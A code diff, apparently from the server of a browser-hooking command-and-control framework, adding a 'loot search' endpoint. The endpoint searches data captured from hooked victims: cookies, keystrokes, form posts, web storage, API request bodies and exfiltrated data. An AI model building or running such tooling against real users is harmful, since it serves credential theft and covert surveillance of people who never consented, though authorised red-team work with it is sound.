+    # Cascade delete target rules and orphaned jobs for this payload
+    PayloadTargetRule.query.filter_by(payloadKey=payload.id).delete()
+    ClientPayloadJob.query.filter_by(payloadKey=payload.id).delete()
+
     db_session.delete(payload)
     dbCommit()
 
     return "ok", 200
+
+
+# Loot Search - cross-client content search
+def escape_like(s):
+    return s.replace('\\', '\\\\').replace('%', r'\%').replace('_', r'\_')
+
+
+@app.route('/api/lootSearch', methods=['POST'])
+@login_required
+def lootSearch():
+    content    = request.json
+    clientFilter = content.get('clientFilter', '').strip()
+    searchQuery  = content.get('searchQuery', '').strip()
+    eventTypes   = content.get('eventTypes', [])
+    sortOrder    = content.get('sortOrder', 'newest')
+    page         = content.get('page', 1)
+    perPage      = 50
+
+    # Phase 1: Filter clients
+    clients = Client.query.all()
+    if clientFilter:
+        terms = []
+        for t in clientFilter.split('&&'):
+            t = t.strip().lower()
+            if not t:
+                continue
+            negate = False
+            if t.startswith('!'):
+                negate = True
+                t = t[1:].strip()
+            if t:
+                terms.append({'term': t, 'negate': negate})
+
+        filtered = []
+        for c in clients:
+            haystack = ' '.join([
+                c.tag or '', c.nickname or '', c.ipAddress or '',
+                c.platform or '', c.browser or '',
+                c.clientType or '', c.domain or '', c.uuid or ''
+            ]).lower()
+            keep = True
+            for term in terms:
+                found = term['term'] in haystack
+                if term['negate'] and found:
+                    keep = False
+                    break
+                elif not term['negate'] and not found:
+                    keep = False
+                    break
+            if keep:
+                filtered.append(c)
+        clients = filtered
+
+    if not clients:
+        return jsonify({'results': [], 'total': 0, 'page': 1, 'pages': 0})
+
+    # Build lookup maps
+    clientByUuid = {c.uuid: c for c in clients}
+    clientById   = {c.id: c for c in clients}
+    uuids = list(clientByUuid.keys())
+
+    # For beacon events, find BeaconDomain IDs belonging to these clients
+    beaconDomainMap = {}  # domainID -> client
+    if any(et in eventTypes for et in ['BEACON_CAPTURE', 'BEACON_VISIT']):
+        domains = BeaconDomain.query.filter(BeaconDomain.clientID.in_(uuids)).all()
+        for d in domains:
+            beaconDomainMap[d.id] = clientByUuid.get(d.clientID)
+
+    escapedQuery = escape_like(searchQuery) if searchQuery else None
+    allResults = []
+
+    # Phase 2: Search loot tables
+    # Helper to add LIKE filters
+    def like_filter(col):
+        return col.ilike('%' + escapedQuery + '%', escape='\\')
+
+    # USERINPUT
+    if 'USERINPUT' in eventTypes:
+        q = UserInput.query.filter(UserInput.clientID.in_(uuids))
+        if escapedQuery:
+            q = q.filter(or_(like_filter(UserInput.inputName), like_filter(UserInput.inputValue)))
+        for r in q.all():
+            c = clientByUuid.get(r.clientID)
+            if c:
+                allResults.append({
+                    'clientNickname': c.nickname, 'clientTag': c.tag or '',
+                    'clientType': c.clientType, 'clientIP': c.ipAddress or '',
+                    'clientId': c.id, 'eventType': 'USERINPUT',
+                    'timeStamp': r.timeStamp.strftime('%Y-%m-%d %H:%M:%S') if r.timeStamp else '',
+                    '_ts': r.timeStamp,
+                    'fields': {'Input Name': r.inputName, 'Input Value': r.inputValue}
+                })
+
+    # FORMPOST
+    if 'FORMPOST' in eventTypes:
+        q = FormPost.query.filter(FormPost.clientID.in_(uuids))
+        if escapedQuery:
+            q = q.filter(or_(
+                like_filter(FormPost.formName), like_filter(FormPost.formAction),
+                like_filter(FormPost.formData), like_filter(FormPost.url)
+            ))
+        for r in q.all():
+            c = clientByUuid.get(r.clientID)
+            if c:
+                allResults.append({
+                    'clientNickname': c.nickname, 'clientTag': c.tag or '',
+                    'clientType': c.clientType, 'clientIP': c.ipAddress or '',
+                    'clientId': c.id, 'eventType': 'FORMPOST',
+                    'timeStamp': r.timeStamp.strftime('%Y-%m-%d %H:%M:%S') if r.timeStamp else '',
+                    '_ts': r.timeStamp,
+                    'fields': {'Form Name': r.formName or '', 'Form Action': r.formAction,
+                               'Form Data': r.formData or '', 'URL': r.url}
+                })
+
+    # COOKIE
+    if 'COOKIE' in eventTypes:
+        q = Cookie.query.filter(Cookie.clientID.in_(uuids))
+        if escapedQuery:
+            q = q.filter(or_(like_filter(Cookie.cookieName), like_filter(Cookie.cookieValue)))
+        for r in q.all():
+            c = clientByUuid.get(r.clientID)
+            if c:
+                allResults.append({
+                    'clientNickname': c.nickname, 'clientTag': c.tag or '',
+                    'clientType': c.clientType, 'clientIP': c.ipAddress or '',
+                    'clientId': c.id, 'eventType': 'COOKIE',
+                    'timeStamp': r.timeStamp.strftime('%Y-%m-%d %H:%M:%S') if r.timeStamp else '',
+                    '_ts': r.timeStamp,
+                    'fields': {'Cookie Name': r.cookieName, 'Cookie Value': r.cookieValue}
+                })
+
+    # LOCALSTORAGE
+    if 'LOCALSTORAGE' in eventTypes:
+        q = LocalStorage.query.filter(LocalStorage.clientID.in_(uuids))
+        if escapedQuery:
+            q = q.filter(or_(like_filter(LocalStorage.key), like_filter(LocalStorage.value)))
+        for r in q.all():
+            c = clientByUuid.get(r.clientID)
+            if c:
+                allResults.append({
+                    'clientNickname': c.nickname, 'clientTag': c.tag or '',
+                    'clientType': c.clientType, 'clientIP': c.ipAddress or '',
+                    'clientId': c.id, 'eventType': 'LOCALSTORAGE',
+                    'timeStamp': r.timeStamp.strftime('%Y-%m-%d %H:%M:%S') if r.timeStamp else '',
+                    '_ts': r.timeStamp,
+                    'fields': {'Key': r.key, 'Value': r.value}
+                })
+
+    # SESSIONSTORAGE
+    if 'SESSIONSTORAGE' in eventTypes:
+        q = SessionStorage.query.filter(SessionStorage.clientID.in_(uuids))
+        if escapedQuery:
+            q = q.filter(or_(like_filter(SessionStorage.key), like_filter(SessionStorage.value)))
+        for r in q.all():
+            c = clientByUuid.get(r.clientID)
+            if c:
+                allResults.append({
+                    'clientNickname': c.nickname, 'clientTag': c.tag or '',
+                    'clientType': c.clientType, 'clientIP': c.ipAddress or '',
+                    'clientId': c.id, 'eventType': 'SESSIONSTORAGE',
+                    'timeStamp': r.timeStamp.strftime('%Y-%m-%d %H:%M:%S') if r.timeStamp else '',
+                    '_ts': r.timeStamp,
+                    'fields': {'Key': r.key, 'Value': r.value}
+                })
+
+    # KEYLOG
+    if 'KEYLOG' in eventTypes:
+        q = Keylog.query.filter(Keylog.clientID.in_(uuids))
+        if escapedQuery:
+            q = q.filter(or_(like_filter(Keylog.keys), like_filter(Keylog.target), like_filter(Keylog.url)))
+        for r in q.all():
+            c = clientByUuid.get(r.clientID)
+            if c:
+                allResults.append({
+                    'clientNickname': c.nickname, 'clientTag': c.tag or '',
+                    'clientType': c.clientType, 'clientIP': c.ipAddress or '',
+                    'clientId': c.id, 'eventType': 'KEYLOG',
+                    'timeStamp': r.timeStamp.strftime('%Y-%m-%d %H:%M:%S') if r.timeStamp else '',
+                    '_ts': r.timeStamp,
+                    'fields': {'Keystrokes': r.keys, 'Target': r.target, 'URL': r.url}
+                })
+
+    # URLVISITED
+    if 'URLVISITED' in eventTypes:
+        q = UrlVisited.query.filter(UrlVisited.clientID.in_(uuids))
+        if escapedQuery:
+            q = q.filter(like_filter(UrlVisited.url))
+        for r in q.all():
+            c = clientByUuid.get(r.clientID)
+            if c:
+                allResults.append({
+                    'clientNickname': c.nickname, 'clientTag': c.tag or '',
+                    'clientType': c.clientType, 'clientIP': c.ipAddress or '',
+                    'clientId': c.id, 'eventType': 'URLVISITED',
+                    'timeStamp': r.timeStamp.strftime('%Y-%m-%d %H:%M:%S') if r.timeStamp else '',
+                    '_ts': r.timeStamp,
+                    'fields': {'URL': r.url}
+                })
+
+    # XHRAPICALL
+    if 'XHRAPICALL' in eventTypes:
+        q = XhrApiCall.query.filter(XhrApiCall.clientID.in_(uuids))
+        if escapedQuery:
+            q = q.filter(or_(
+                like_filter(XhrApiCall.url), like_filter(XhrApiCall.requestBody),
+                like_filter(XhrApiCall.responseBody)
+            ))
+        for r in q.all():
+            c = clientByUuid.get(r.clientID)
+            if c:
+                allResults.append({
+                    'clientNickname': c.nickname, 'clientTag': c.tag or '',
+                    'clientType': c.clientType, 'clientIP': c.ipAddress or '',
+                    'clientId': c.id, 'eventType': 'XHRAPICALL',
+                    'timeStamp': r.timeStamp.strftime('%Y-%m-%d %H:%M:%S') if r.timeStamp else '',
+                    '_ts': r.timeStamp,
+                    'fields': {'URL': r.url, 'Request Body': r.requestBody or '',
+                               'Response Body': r.responseBody or ''}
+                })
+
+    # FETCHAPICALL
+    if 'FETCHAPICALL' in eventTypes:
+        q = FetchApiCall.query.filter(FetchApiCall.clientID.in_(uuids))
+        if escapedQuery:
+            q = q.filter(or_(
+                like_filter(FetchApiCall.url), like_filter(FetchApiCall.requestBody),
+                like_filter(FetchApiCall.responseBody)
+            ))
+        for r in q.all():
+            c = clientByUuid.get(r.clientID)
+            if c:
+                allResults.append({
+                    'clientNickname': c.nickname, 'clientTag': c.tag or '',
+                    'clientType': c.clientType, 'clientIP': c.ipAddress or '',
+                    'clientId': c.id, 'eventType': 'FETCHAPICALL',
+                    'timeStamp': r.timeStamp.strftime('%Y-%m-%d %H:%M:%S') if r.timeStamp else '',
+                    '_ts': r.timeStamp,
+                    'fields': {'URL': r.url, 'Request Body': r.requestBody or '',
+                               'Response Body': r.responseBody or ''}
+                })
+
+    # CUSTOMEXFIL — linked through Event table (no clientID on CustomExfil)
+    if 'CUSTOMEXFIL' in eventTypes:
+        events = Event.query.filter(Event.clientID.in_(uuids), Event.eventType == 'CUSTOMEXFIL').all()
+        exfilIds = [e.eventID for e in events]
+        eventClientMap = {e.eventID: e.clientID for e in events}
+        if exfilIds:
+            q = CustomExfil.query.filter(CustomExfil.id.in_(exfilIds))
+            if escapedQuery:
+                q = q.filter(or_(like_filter(CustomExfil.note), like_filter(CustomExfil.data)))
+            for r in q.all():
+                cUuid = eventClientMap.get(r.id)
+                c = clientByUuid.get(cUuid) if cUuid else None
+                if c:
+                    allResults.append({
+                        'clientNickname': c.nickname, 'clientTag': c.tag or '',
+                        'clientType': c.clientType, 'clientIP': c.ipAddress or '',
+                        'clientId': c.id, 'eventType': 'CUSTOMEXFIL',
+                        'timeStamp': r.timeStamp.strftime('%Y-%m-%d %H:%M:%S') if r.timeStamp else '',
+                        '_ts': r.timeStamp,
+                        'fields': {'Note': r.note or '', 'Data': r.data or ''}
+                    })
+
+    # BEACON_CAPTURE
+    if 'BEACON_CAPTURE' in eventTypes and beaconDomainMap:
+        domainIds = list(beaconDomainMap.keys())
+        q = BeaconCapture.query.filter(BeaconCapture.domainID.in_(domainIds))
+        if escapedQuery:
+            q = q.filter(or_(like_filter(BeaconCapture.name), like_filter(BeaconCapture.value)))
+        for r in q.all():
+            c = beaconDomainMap.get(r.domainID)
+            if c:
+                allResults.append({
+                    'clientNickname': c.nickname, 'clientTag': c.tag or '',
+                    'clientType': c.clientType, 'clientIP': c.ipAddress or '',
+                    'clientId': c.id, 'eventType': 'BEACON_CAPTURE',
+                    'timeStamp': r.capturedAt.strftime('%Y-%m-%d %H:%M:%S') if r.capturedAt else '',
+                    '_ts': r.capturedAt,
+                    'fields': {'Name': r.name, 'Value': r.value}
+                })
+
+    # BEACON_VISIT
+    if 'BEACON_VISIT' in eventTypes and beaconDomainMap:
+        domainIds = list(beaconDomainMap.keys())
+        q = BeaconVisit.query.filter(BeaconVisit.domainID.in_(domainIds))
+        if escapedQuery:
+            q = q.filter(like_filter(BeaconVisit.url))
+        for r in q.all():
+            c = beaconDomainMap.get(r.domainID)
+            if c:
+                allResults.append({
+                    'clientNickname': c.nickname, 'clientTag': c.tag or '',
+                    'clientType': c.clientType, 'clientIP': c.ipAddress or '',
+                    'clientId': c.id, 'eventType': 'BEACON_VISIT',
+                    'timeStamp': r.visitTime.strftime('%Y-%m-%d %H:%M:%S') if r.visitTime else '',
+                    '_ts': r.visitTime,
+                    'fields': {'URL': r.url}
+                })
+
+    # Sort by timestamp
+    descending = (sortOrder != 'oldest')
+    allResults.sort(key=lambda x: x.get('_ts') or datetime.datetime.min, reverse=descending)
+
+    # Remove internal sort key
+    for r in allResults:
+        r.pop('_ts', None)
+
+    # Paginate
+    total = len(allResults)
+    pages = (total + perPage - 1) // perPage if total > 0 else 0
+    start = (page - 1) * perPage
+    end   = start + perPage
+    pageResults = allResults[start:end]
+
+    return jsonify({
+        'results': pageResults,
+        'total': total,
+        'page': page,
+        'pages': pages,
+        'sortOrder': sortOrder
+    })
+
 
 #**************************************************************************
 
@@ -3133,6 +5265,9 @@ if __name__ == '__main__':
     # printHeader()
 
     logger.info("Python main running....")
+
+    # Clean up any proxy instances from previous runs
+    stop_all_proxies()
 
     # Response configuration
     WSGIRequestHandler.protocol_version = "HTTP/1.1"
@@ -3145,7 +5280,7 @@ if __name__ == '__main__':
         app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=1, x_prefix=1)
         app.run(debug=False, host='0.0.0.0', port=8444)
     else:
-        app.run(debug=False, host='0.0.0.0', port=8444, ssl_context='adhoc')
+        app.run(debug=False, host='0.0.0.0', port=8444, ssl_context=('cert.pem', 'key.pem'))
        
 
 
